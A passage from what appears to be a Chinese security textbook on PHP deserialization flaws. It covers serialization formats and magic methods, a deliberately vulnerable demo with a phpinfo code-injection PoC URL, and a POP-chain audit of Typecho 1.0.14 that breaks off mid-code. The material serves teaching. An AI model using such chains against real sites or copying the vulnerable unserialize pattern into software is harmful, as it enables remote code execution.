\r
\r
<?php\r
\r
$t=true;$f=false;\r
\r
$tr=serialize($t);\r
\r
$fa=serialize($f);\r
\r
echo "serialize true result: ".$tr;\r
\r
echo "serialize false result: ".$fa;\r
\r
?>\r
\r
\r
\r
\u8F93\u51FA\u7ED3\u679C\u4E3A\uFF1Aserialize true result: **b:1**;serialize false result: **b:0**;\u3002\r
\r
\uFF083\uFF09  \u6570\u7EC4\u7C7B\u578B\u7684\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2D\u6570\u7EC4\u901A\u5E38\u88AB\u5E8F\u5217\u5316\u4E3A\uFF1Aa:<n>:{<key1><value1><key2><value2>\u2026<keyn><valuen>}\uFF0C\u5176\u4E2D<n>\u8868\u793A\u6570\u7EC4\u5143\u7D20\u4E2A\u6570\uFF0C<key1><key2>\u2026<keyn>\u8868\u793A\u6570\u7EC4\u4E0B\u6807\uFF0C<value1><value2>\u2026<valuen>\u8868\u793A\u4E0E\u4E0B\u6807\u5BF9\u5E94\u7684\u6570\u7EC4\u5143\u7D20\u7684\u503C\u3002\r
\r
\u5BF9\u4E8E\u4E0B\u6807\u7C7B\u578B\u800C\u8A00\uFF0C\u5176\u53EF\u4EE5\u662F\u6574\u5F62\u548C\u5B57\u7B26\u4E32\u578B\uFF0C\u6570\u7EC4\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u4E0E\u6574\u6570\u548C\u5B57\u7B26\u4E32\u6570\u636E\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u76F8\u540C\u3002\u5BF9\u4E8E\u5143\u7D20\u503C\u800C\u8A00\uFF0C\u5176\u53EF\u4EE5\u662F\u4EFB\u610F\u7C7B\u578B\uFF0C\u5176\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u4E0E\u5176\u6240\u5BF9\u5E94\u7684\u7C7B\u578B\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u76F8\u540C\u3002\r
\r
\u4F8B\u5982\uFF1A\u6570\u7EC4\u4E3Aarray(\u201CVolvo\u201D,\u201CBMW\u201D,\u201CSAAB\u201D)\uFF0C\u5E8F\u5217\u5316\u540E\u5176\u7ED3\u679C\u4E3Aa:3:{i:0;s:5:\u201CVolvo\u201D;i:1;s:3:\u201CBMW\u201D;i:2;s:4:\u201CSAAB\u201D}\u3002i\u8868\u793A\u6570\u7EC4\u4E0B\u6807\uFF0Cs\u8868\u793A\u6570\u7EC4\u5143\u7D20\u957F\u5EA6\u4E0E\u503C\u3002\r
\r
\uFF084\uFF09  \u5BF9\u8C61\u7684\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2D\u5BF9\u8C61\u5E8F\u5217\u5316\u540E\u4E3A\uFF1AO:<length>:\u201D<class name>\u201D:<n>:{<field name 1><field value 1><field name 2><field value 2>\u2026<field name n><field value n>}\r
\r
\u5176\u4E2D<length>\u8868\u793A\u5BF9\u8C61\u7C7B\u540D\u7684\u5B57\u7B26\u4E32\u957F\u5EA6\uFF0C<class name>\u8868\u793A\u5BF9\u8C61\u7684\u7C7B\u540D\uFF1B<n>\u8868\u793A\u5BF9\u8C61\u4E2D\u5B57\u6BB5\u4E2A\u6570\uFF0C\u8FD9\u4E9B\u5B57\u6BB5\u5305\u62EC\u5728\u5BF9\u8C61\u6240\u5728\u7C7B\u53CA\u5176\u7236\u7C7B\u4E2D\u7528var\u3001public\u3001protected\u3001private\u58F0\u660E\u7684\u5B57\u6BB5\uFF0C\u4F46\u4E0D\u5305\u62EC\u7528static\u548Cconst\u58F0\u660E\u7684\u9759\u6001\u5B57\u6BB5\uFF0C\u4E5F\u5C31\u662F\u53EA\u6709\u5B9E\u4F8B\u5B57\u6BB5\uFF1B<filed name 1>,<filed name 2>,\u2026,<filed name n>\u8868\u793A\u4E0E\u5B57\u6BB5\u540D\u5BF9\u5E94\u7684\u5B57\u6BB5\u503C\u3002\r
\r
\u5B57\u6BB5\u540D\u662F\u5B57\u7B26\u4E32\u578B\uFF0C\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u4E0E\u5B57\u7B26\u4E32\u578B\u6570\u636E\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u76F8\u540C\u3002\u5B57\u6BB5\u503C\u53EF\u4EE5\u662F\u4EFB\u610F\u7C7B\u578B\uFF0C\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u4E0E\u5176\u6240\u5BF9\u5E94\u7684\u7C7B\u578B\u5E8F\u5217\u5316\u540E\u7684\u683C\u5F0F\u76F8\u540C\u3002\r
\r
\u5BF9\u8C61\u5E8F\u5217\u5316\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
header("Content-type: text/html;charset=utf-8");\r
\r
class Foo{\r
\r
  public **$aMemberVar**='aMemberVar Member Variable';\r
\r
  public **$aFuncName**='aMemberFunc';\r
\r
  function **aMemberFunc**(){\r
\r
\u200B    print 'Inside \`aMemberFunc()\`';\r
\r
  }}\r
\r
$foo = new Foo;\r
\r
$tr = serialize($foo);\r
\r
print $tr;\r
\r
?>\r
\r
\r
\r
\u8F93\u51FA\u7ED3\u679C\u4E3A\uFF1AO:3:"Foo":2:{s:10:"aMemberVar";s:26:"aMemberVar Member Variable";s:9:"aFuncName";s:11:"aMemberFunc";}\u3002\r
\r
\u5176\u4E2D\uFF0CO\u8868\u793A\u5BF9\u8C61\uFF0C3\u8868\u793A\u5BF9\u8C61\u7C7B\u540D\u7684\u5B57\u7B26\u4E32\u957F\u5EA6\u4E3A3\uFF0CFoo\u8868\u793A\u5BF9\u8C61\u7684\u7C7B\u540D\u4E3AFoo\uFF0C2\u8868\u793A\u6709\u4E24\u4E2A\u6570\u636E\u5B57\u6BB5\uFF08\u7C7B\u6210\u5458\uFF09\u3002\r
\r
{s:10:"aMemberVar";s:26:"aMemberVar Member Variable";s:9:"aFuncName";s:11:"aMemberFunc";}\u8868\u793A\u5177\u4F53\u7684\u6570\u636E\u5B57\u6BB5\u4E0E\u5B57\u6BB5\u503C\u3002\r
\r
\u7B2C\u4E00\u4E2A\u5B57\u6BB5s:10:"aMemberVar";s:26:"aMemberVar Member Variable"\u7684\u542B\u4E49\u4E3A\uFF1A\r
\r
s:10:"aMemberVar"\u8868\u793A\u5B57\u6BB5\u7684\u7C7B\u578B\u4E3Astring\uFF0C\u5B57\u6BB5\u957F\u5EA6\u4E3A10\uFF0C\u5B57\u6BB5\u7684\u540D\u79F0\u4E3AaMemberVar\u3002\r
\r
\uFF085\uFF09  \u5176\u4ED6\u7C7B\u578B\u7684\u5E8F\u5217\u5316\r
\r
  Integer\u7C7B\u578B\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2Dinterger\u7C7B\u578B\u6570\u636E\u5E8F\u5217\u5316\u540E\u4E3Ai:<number>\uFF0C\u5176\u4E2D<number>\u4E3A\u4E00\u4E2A\u6574\u6570\u578B\uFF0C\u8303\u56F4\u662F-2147483648\u81F32147483647\uFF0C\u6570\u5B57\u524D\u9762\u53EF\u4EE5\u6709\u6B63\u8D1F\u53F7\u3002\u5982\u679C\u88AB\u5E8F\u5217\u5316\u7684\u6570\u5B57\u8D85\u8FC7\u8BE5\u8303\u56F4\uFF0C\u5219\u4F1A\u88AB\u5E8F\u5217\u5316\u4E3A\u6D6E\u70B9\u578B\u3002\u4F8B\u5982\uFF1A\u5E8F\u5217\u5316\u7684\u6570\u5B57123\uFF0C\u5E8F\u5217\u5316\u540E\u7684\u7ED3\u679C\u4E3Ai:123\u3002\r
\r
  double\u7C7B\u578B\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2Ddouble\u7C7B\u578B\u6570\u636E\u5E8F\u5217\u5316\u540E\u4E3Ad:<number>\uFF0C\u5176\u4E2D<number>\u4E3A\u4E00\u4E2A\u6D6E\u70B9\u578B\uFF0C\u4F8B\u5982\uFF1A\u5E8F\u5217\u5316\u7684\u6570\u5B571.5\uFF0C\u5E8F\u5217\u5316\u540E\u7684\u7ED3\u679C\u4E3Ad:1.5\u3002\r
\r
  string\u7C7B\u578B\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2Dstring\u7C7B\u578B\u6570\u636E\u5E8F\u5217\u5316\u540E\u4E3As:<length>:\u201D<value>\u201D\uFF0C\u5176\u4E2D<length>\u4E3A\u5B57\u7B26\u4E32\u957F\u5EA6\uFF0C<value>\u4E3A\u5B57\u7B26\u4E32\u6570\u503C\u3002\u4F8B\u5982\uFF1A\u5E8F\u5217\u5316string\u7C7B\u578B\u6570\u636Etest\uFF0C\u5E8F\u5217\u5316\u540E\u7684\u7ED3\u679C\u4E3As:4:\u201Dtest\u201D\u3002\r
\r
### 10.4.2 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u4ECB\u7ECD\r
\r
\uFF081\uFF09\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u57FA\u7840\u77E5\u8BC6\r
\r
PHP\u4E2D\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u4EA7\u751F\u4E3B\u8981\u6709\u4EE5\u4E0B\u4E24\u4E2A\u539F\u56E0\uFF1A\r
\r
l unserialize\u51FD\u6570\u7684\u53C2\u6570\u53EF\u63A7\u3002\r
\r
l \u9B54\u672F\u51FD\u6570\u8C03\u7528\u3002\r
\r
PHP\u5C06\u6240\u6709\u4EE5__\u5F00\u5934\u7684\u51FD\u6570\u4FDD\u7559\u4E3A\u9B54\u672F\u51FD\u6570\uFF0C\u6240\u4EE5\u5728\u5B9A\u4E49\u7C7B\u65B9\u6CD5\u65F6\u4E0D\u8981\u4EE5__\u4F5C\u4E3A\u524D\u7F00\uFF0CPHP\u7684\u9B54\u672F\u51FD\u6570\u5305\u62EC\uFF1A__construct\u3001__destruct\u3001__call\u3001__callStatic\u3001__get\u3001__set\u3001__isset\u3001__unset\u3001__sleep\u3001__wakeup\u3001__toString\u3001__invoke\u3001__set_state\u3001__clone\u548C__debuginfo\u7B49\u6210\u5458\u51FD\u6570\u3002\r
\r
  __construct\u51FD\u6570\r
\r
\u5177\u6709\u6784\u9020\u65B9\u6CD5\u7684\u7C7B\u4F1A\u5728\u6BCF\u6B21\u521B\u5EFA\u65B0\u5BF9\u8C61\u65F6\u5148\u8C03\u7528\u8BE5\u65B9\u6CD5\u3002\r
\r
  __destruct\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u4F1A\u5728\u5BF9\u67D0\u4E2A\u5BF9\u8C61\u7684\u6240\u6709\u5F15\u7528\u90FD\u88AB\u5220\u9664\u6216\u5BF9\u8C61\u88AB\u663E\u793A\u9500\u6BC1\u65F6\u6267\u884C\u3002\r
\r
  __sleep\u51FD\u6570\r
\r
serialize\u51FD\u6570\u4F1A\u68C0\u67E5\u7C7B\u4E2D\u662F\u5426\u5B58\u5728__sleep\u51FD\u6570\uFF0C\u5982\u679C\u5B58\u5728\u5219\u5148\u88AB\u8C03\u7528\uFF0C\u7136\u540E\u624D\u6267\u884C\u5E8F\u5217\u5316\u64CD\u4F5C\u3002\r
\r
  __wakeup\u51FD\u6570\r
\r
unserialize\u51FD\u6570\u4F1A\u68C0\u67E5\u662F\u5426\u5B58\u5728__wakeup\u51FD\u6570\uFF0C\u5982\u679C\u5B58\u5728\u5219\u4F1A\u8C03\u7528__wakeup\u51FD\u6570\uFF0C\u9884\u5148\u51C6\u5907\u5BF9\u8C61\u9700\u8981\u7684\u8D44\u6E90\u3002\r
\r
  __toString\u51FD\u6570\r
\r
\u5F53\u4E00\u4E2A\u5BF9\u8C61\u88AB\u5F53\u505A\u5B57\u7B26\u4E32\u4F7F\u7528\u65F6\uFF0C\u5C06\u9ED8\u8BA4\u8C03\u7528__toString\u51FD\u6570\uFF0C\u5C06\u5176\u8F6C\u5316\u4E3A\u5B57\u7B26\u4E32\u3002\r
\r
\uFF082\uFF09\u901A\u8FC7\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u53EF\u4EE5\u63A7\u5236\u51FD\u6570\u4E2D\u53C2\u6570\u503C\uFF0C\u4ECE\u800C\u4F7F\u5F97\u7A0B\u5E8F\u9519\u8BEF\u6267\u884C\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
highlight_file(__FILE__);\r
\r
class a{\r
\r
  var $test = 'hello';\r
\r
  function __destruct(){\r
\r
//\u5F53\u6784\u9020a\u5BF9\u8C61\u65F6\u6253\u5F00hello.php\u6587\u4EF6\uFF0C\u5411\u8BE5\u6587\u4EF6\u4E2D\u5199\u5165$test->test\u503C\r
\r
\u200B    $fp=fopen("/var/www/html/hello.php","w");\r
\r
\u200B    fputs($fp,$this->test);\r
\r
\u200B    fclose($fp);\r
\r
  }\r
\r
}\r
\r
//\u901A\u8FC7re\u53C2\u6570\u83B7\u53D6\u503C\u7ED9$class\u53D8\u91CF\r
\r
$class=stripslashes($_GET['re']);\r
\r
//\u5BF9$class\u53D8\u91CF\u8FDB\u884C\u53CD\u5E8F\u5217\r
\r
$class_unser=unserilalize($class);\r
\r
require '/var/www/html/hello.php';\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u5B58\u5728\u53CD\u5E8F\u5217\u6F0F\u6D1E\uFF0C\u5176\u4E3B\u8981\u539F\u56E0\u662F\uFF1A\r
\r
unserialize\u51FD\u6570\u7684\u53C2\u6570$class\u53EF\u63A7\u3002\u540C\u65F6\uFF0C\u5B58\u5728__destruct\u51FD\u6570\uFF0C\u6B64\u51FD\u6570\u4F1A\u5C06$this->test\u503C\u5199\u5165/var/www/html/hello.php\u6587\u4EF6\u4E2D\u3002\r
\r
\uFF083\uFF09\u4E0B\u9762\u7ED9\u51FA\u6F0F\u6D1E\u5229\u7528\u8FC7\u7A0B\uFF1A\r
\r
\u901A\u8FC7\u53C2\u6570re\u4F20\u5165\u7684\u503C\u6765\u5B9E\u4F8B\u5316\u7C7Ba\uFF0C\u5E76\u4E14\u6539\u53D8$test\u7684\u503C\u3002\u56E0\u4E3A__destruct\u51FD\u6570\u53EF\u4EE5\u5C06$test\u7684\u503C\u5199\u5165hello.php\u6587\u4EF6\u4E2D\uFF0C\u6240\u4EE5\u53EF\u4EE5\u5229\u7528\u8BE5\u51FD\u6570\u5C06PHP\u4EE3\u7801\u4F20\u5165hello.php\u6587\u4EF6\u4E2D\u3002\r
\r
\u9996\u5148\u5B9E\u4F8B\u5316\u5BF9\u8C61\uFF1A\r
\r
\r
\r
<?php\r
\r
class a{\r
\r
  var $test='<?php phpinfo();?>';\r
\r
}\r
\r
$a = new a();\r
\r
$class_ser = serialize($a);\r
\r
print_r($class_ser);\r
\r
?>\r
\r
\r
\r
\u8F93\u51FA\u4E3AO:1:"a":1:{s:4:"test";s:18:"<?php phpinfo();?>";}\uFF0C\u5C06\u5BF9\u8C61\u7684\u5E8F\u5217\u5316\u7ED3\u679C\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\uFF0C\u4E3Ahello.php\u6587\u4EF6\u5199\u5165\u6076\u610F\u4EE3\u7801\uFF0C\u5176\u6784\u9020\u7684POC\u5982\u4E0B\uFF1A\r
\r
http://ip/index.php?re= O:1:"a":1:{s:4:"test";s:18:"<?php phpinfo();?>";}\r
\r
\u7136\u540E\u8BBF\u95EEhttp://ip/hello.php\u53EF\u8F93\u51FAphpinfo\u4FE1\u606F\uFF0C\u5982\u56FE10-10\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image498.gif)\r
\r
\u56FE10-10 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\r
## 10.5 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1ECMS\u5B9E\u8DF5\r
\r
### 10.5.1  \u5B9E\u9A8C\uFF1ATypecho1.0.14\u53CD\u5E8F\u5217\u5316\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9Typecho 1.0.14\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3002Typecho\u662F\u4E00\u4E2A\u57FA\u4E8EPHP5\u5F00\u53D1\u7684\u5F00\u6E90\u535A\u5BA2CMS\u7CFB\u7EDF\uFF0C\u57281.0.14\u7248\u672C\u4E2D\u5B58\u5728\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C\u4E3B\u8981\u662Finstall\u76EE\u5F55\u4E0B\u7684install.php\u6587\u4EF6\u5185\u4F7F\u7528\u4E86unserialize\u51FD\u6570\u53CD\u5E8F\u5217\u5316\uFF0C\u800CTypecho_Cookie\u7C7B\u7684get()\u65B9\u6CD5\u83B7\u53D6\u7684__typecho_config\u53C2\u6570\u5B58\u5728\u4E00\u4E9B\u5371\u9669\u53EF\u63A7\u7684\u64CD\u4F5C\uFF08\u8C03\u7528\u4E86\u9B54\u6CD5\u51FD\u6570\uFF09\uFF0C\u5E76\u4E14\u5BF9__typecho_config\u53C2\u6570\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u901A\u8FC7POP\u5229\u7528\u94FE\u6CE8\u5165\u6076\u610F\u7684\u53CD\u5E8F\u5217\u5316\u5BF9\u8C61\uFF0C\u6267\u884C\u4EFB\u610FPHP\u4EE3\u7801\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u800310.4.1\u8282\uFF1A\u5E8F\u5217\u5316\u4ECB\u7ECD\uFF1B10.4.2\u8282\uFF1A\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u4ECB\u7ECD\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BTypecho 1.0.14\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\u7531\u4E8Ebuild\\install.php\u6587\u4EF6\u4E2D\u5177\u6709unserialize\u51FD\u6570\u8C03\u7528\u53CD\u5E8F\u5217\u5316\uFF0C\u56E0\u6B64\u53EF\u4EE5\u5BF9\u8BE5\u6587\u4EF6\u7684\u5173\u952E\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
// \u6321\u6389\u53EF\u80FD\u7684\u8DE8\u7AD9\u8BF7\u6C42\r
\r
if (!empty($_GET) || !empty($_POST)) {\r
\r
**//\u5982\u679CHTTP\u8BF7\u6C42\u5934\u4E2D\u4E0D\u5B58\u5728referer\u5C06\u76F4\u63A5\u9000\u51FA**\r
\r
  **if (empty($_SERVER['HTTP_REFERER'])) {exit;}**\r
\r
  $parts = parse_url($_SERVER['HTTP_REFERER']);//\u5BF9referer\u8FDB\u884C\u89E3\u6790\u5DE5\u4F5C\r
\r
  if (!empty($parts['port']) && $parts['port'] != 80) {\r
\r
\u200B    $parts['host'] = "{$parts['host']}:{$parts['port']}";}//\u62FC\u63A5\u4E3B\u673A\u4E0E\u7AEF\u53E3\r
\r
  if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {//\u68C0\u67E5referer\u662F\u5426\u6B63\u786E\uFF0C\u82E5\u4E0D\u6B63\u786E\u5219\u76F4\u63A5\u9000\u51FA\r
\r
\u200B    exit;}}\r
\r
\u2026\u7701\u7565\u2026\r
\r
<?php\r
\r
 **$config =** **unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));**\r
\r
 Typecho_Cookie::delete('__typecho_config');\r
\r
 $db = **new Typecho_Db($config['adapter'], $config['prefix']);**\r
\r
 $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\r
\r
 Typecho_Db::set($db);\r
\r
?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u91CD\u70B9\u90E8\u5206\uFF1A\r
\r
l install.php\u6E90\u6587\u4EF6\u9996\u5148\u63A5\u6536\u4E86\u8BF7\u6C42\u4E2D\u7684finish\u53C2\u6570\uFF0C\u7136\u540E\u6821\u9A8C\u4E86HTTP_REFERER\u5B57\u6BB5\uFF0C\u56E0\u6B64\u63D0\u4EA4\u7684\u8BF7\u6C42\u4E2DHTTP_REFERER\u5B57\u6BB5\u4E0D\u80FD\u4E3A\u7A7A\u3002\r
\r
l Typecho_Cookie\u7C7B\u83B7\u53D6\u4E86__typecho_config\u53C2\u6570\u7684\u5185\u5BB9\u5E76\u8FDB\u884Cbase64\u89E3\u5BC6\uFF0C\u53C8\u8C03\u7528\u4E86unserialize\u51FD\u6570\u5BF9__typecho_config\u53CD\u5E8F\u5217\u5316\u3002\r
\r
l \u5C06\u53CD\u5E8F\u5217\u5316\u540E\u7684$config\u4F20\u7ED9\u4E86Typecho_Db\u7C7B\u3002\r
\r
l \u53CD\u5E8F\u5217\u5316\u7684\u53EF\u63A7\u70B9\u5927\u6982\u7387\u5728Typecho_Cookie::get('__typecho_config')\u5904\u3002\r
\r
\u56E0\u6B64\uFF0C\u9700\u8981\u5BF9Typecho_Cookie\u7684\u9759\u6001\u65B9\u6CD5get\u8FDB\u884C\u5206\u6790\uFF08\u786E\u5B9A\u53EF\u63A7\u70B9\uFF09\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public static function get($key, $default = NULL){\r
\r
  $key = self::$_prefix . $key;\r
\r
  **//****\u83B7\u53D6__typecho_config\u7684\u5185\u5BB9\uFF0C\u4ECECookie\u7684__typecho_config\u5B57\u6BB5\u83B7\u53D6\u503C**\r
\r
  $value = **isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] :$default)**;\r
\r
  return is_array($value) ? $default : $value;\r
\r
}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u53EF\u77E5\uFF0Cget\u51FD\u6570\u4E3B\u8981\u662F\u4ECECookie\u4E2D\u83B7\u53D6\u5230__typecho_config\u7684\u5185\u5BB9\u5E76\u8FD4\u56DE\uFF0C\u7531\u4E8ECookie\u662F\u53EF\u4EE5\u66F4\u6539\u7684\uFF0C\u8FD9\u610F\u5473\u7740__typecho_config\u662F\u53EF\u63A7\u7684\u3002\u6839\u636E\u4E4B\u524D\u6211\u4EEC\u5B66\u4E60\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u539F\u7406\u53EF\u77E5\uFF0C\u65E2\u7136\u662F\u53CD\u5E8F\u5217\u5316\u64CD\u4F5C\uFF0C\u5E76\u4E14__typecho_config\u662F\u53EF\u63A7\u7684, \u4E0B\u4E00\u6B65\u5C31\u662F\u5206\u6790\u53CD\u5E8F\u5217\u64CD\u4F5C\u4E2D\u6267\u884C\u4E86\u9B54\u6CD5\u51FD\u6570\u4ECE\u800C\u786E\u5B9A\u5229\u7528\u7684pop\u94FE\u4E86\u3002\r
\r
\uFF082\uFF09\u53CD\u5E8F\u5217\u5316pop\u94FE\u5206\u6790\r
\r
\u7ECF\u8FC7\u5206\u6790\u786E\u5B9A\u4E86\u53CD\u5E8F\u5217\u5316\u540E\u7ED3\u679C\u53C2\u6570$config\u4F20\u7ED9\u4E86Typecho_Db\u7C7B\u7528\u4E8E\u521B\u5EFA\u5BF9\u8C61\uFF0C\u5728\u521B\u5EFA\u5BF9\u8C61\u8FC7\u7A0B\u4E2D\u81EA\u52A8\u8C03\u7528\u9B54\u6CD5\u51FD\u6570__construct\uFF0C\u56E0\u6B64\u5BF9Typecho_Db\u7C7B\u7684__construct\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public function __construct($adapterName, $prefix = 'typecho_'){\r
\r
  /** \u83B7\u53D6\u9002\u914D\u5668\u540D\u79F0 */\r
\r
  $this->_adapterName = $adapterName;\r
\r
  /** \u6570\u636E\u5E93\u9002\u914D\u5668 *///\u5C06adapter\u4E0E\u5B57\u7B26\u4E32\u8FDB\u884C\u62FC\u63A5\r
\r
  **$adapterName = 'Typecho_Db_Adapter_' . $adapterName;**\r
\r
  if (!call_user_func(array($adapterName, 'isAvailable'))) {\r
\r
\u200B    throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");\r
\r
}\r
\r
\u2026\u7701\u7565\u2026}\r
\r
\r
\r
\u76F4\u63A5\u8DF3\u8F6C\u5230\u4E86Typecho_Db\u7C7B\u7684\u5B9A\u4E49\u4E2D\uFF0C__construct\u6784\u9020\u51FD\u6570\u5BF9\u4F20\u5165\u7684\u53C2\u6570\u8FDB\u884C\u521D\u59CB\u5316\uFF0C\u5728\u7B2C\u4E09\u884C\u4EE3\u7801\u4E2D\u5C06Typecho_Db_Adapter\u5B57\u7B26\u4E32\u548C\u53D8\u91CFadapterName\u8FDB\u884C\u62FC\u63A5\u4E86\uFF0C\u503C\u5F97\u6CE8\u610F\u7684\u662F\uFF1A\u6B64\u65F6adapterName\u662F\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u5F53\u628AadapterName\u5BF9\u8C61\u5F53\u4F5C\u5B57\u7B26\u4E32\u8FDB\u884C\u62FC\u63A5\u65F6\uFF0C\u7A0B\u5E8F\u5C06\u81EA\u52A8\u8C03\u7528\u8BE5\u5BF9\u8C61\u7684__toString()\u9B54\u6CD5\u51FD\u6570\uFF0C\u5E76\u4E14\u7531\u4E8EadapterName\u53EF\u63A7\uFF0C\u5982\u679C\u5C06adapterName\u6307\u5411\u4E00\u4E2A\u7C7B\u7684\u8BDD\uFF0C\u90A3\u4E48\u5C31\u53EF\u80FD\u9020\u6210\u53CD\u5E8F\u5217\u6F0F\u6D1E\u3002\r
\r
\u7ECF\u8FC7\u5206\u6790\u53EF\u77E5$config\u6570\u7EC4\u4E2D\u7684adapter\u5143\u7D20\u5176\u5B9E\u662FTypecho_Feed\u5BF9\u8C61\u3002\u56E0\u6B64\uFF0C\u9700\u8981\u5BF9Typecho_Feed\u5BF9\u8C61\u7684__toString()\u65B9\u6CD5\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public function __toString(){\r
\r
  \u2026\u2026\r
\r
  $content .= '<dc:creator>' . htmlspecialchars(**$item['author']->screenName**) . '</dc:creator>' . self::EOL;\r
\r
  \u2026\u2026\r
\r
}\r
\r
\r
\r
__toString\u65B9\u6CD5\u53EA\u7ED9\u51FA\u90E8\u5206\u5173\u952E\u4EE3\u7801\uFF0C\u6709\u4E00\u884C\u4EE3\u7801\u8BBF\u95EE\u4E86$item['author']->screenName \u3002\u6839\u636E\u524D\u9762\u5206\u6790\u53EF\u77E5\uFF0C$item\u662FTypecho_Feed\u4E2D\u7684\u4E00\u4E2A\u5C5E\u6027\uFF0C$item\u7684\u6570\u636E\u7C7B\u578B\u662F\u4E00\u4E2A\u6570\u7EC4\u5E76\u4E14\u53EF\u63A7\u7684\uFF0C\u90A3\u4E48$item['author']\u4E5F\u662F\u53EF\u63A7\u7684\uFF0C\u5982\u679C\u5C06$item['author']\u6307\u5411\u4E00\u4E2A\u4E0D\u5B58\u5728screenName\u5C5E\u6027\u7684\u7C7B\uFF0C\u90A3\u4E48$item['author']->screenName\u5B9E\u9645\u4E0A\u662F\u8BBF\u95EE\u4E86\u4E00\u4E2A\u5BF9\u8C61\u4E2D\u4E0D\u5B58\u5728\u7684\u5C5E\u6027\uFF0C\u8FD9\u65F6\u5019\u7CFB\u7EDF\u5C06\u5C31\u4F1A\u8C03\u7528\u5176__get()\u9B54\u6CD5\u51FD\u6570\u3002\r
\r
\u63A5\u4E0B\u6765pop\u6F0F\u6D1E\u5229\u7528\u94FE\u7684\u65B9\u5411\u5C31\u662F\u9700\u8981\u627E\u5230\u4E00\u4E2A\u6CA1\u6709screenName\u5C5E\u6027\uFF0C\u5E76\u4E14\u8C03\u7528\u4E86__get()\u9B54\u6CD5\u51FD\u6570\u7684\u7C7B\uFF0C\u6700\u7EC8\u627E\u5230Typecho_Request\u7C7B\u3002\u90A3\u4E48\u6211\u4EEC\u5728poc\u4E2D\u8981\u6784\u9020Typecho_Request\u7C7B\uFF0C\u7EE7\u7EED\u8DDF\u8FDB\u5206\u6790__get()\u51FD\u6570\u3002\r
\r
__get()\u9B54\u6CD5\u51FD\u6570\u5185\u90E8\u5B9E\u9645\u4E0A\u662F\u8C03\u7528\u4E86get\u51FD\u6570\uFF0C\u65E2\u7136\u53C2\u6570key\u662F\u53EF\u63A7\u7684\uFF0C\u90A3\u4E48value\u4E5F\u662F\u53EF\u63A7\u7684\uFF0C\u901A\u8FC7this\u5BF9\u8C61\u7684_params\u5C5E\u6027\u6765\u8BBF\u95EEscreenName\u7684\u5185\u5BB9\uFF0C\u8C03\u7528\u4E86_applyFilter\u51FD\u6570\u3002\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  private function _applyFilter($value) {\r
\r
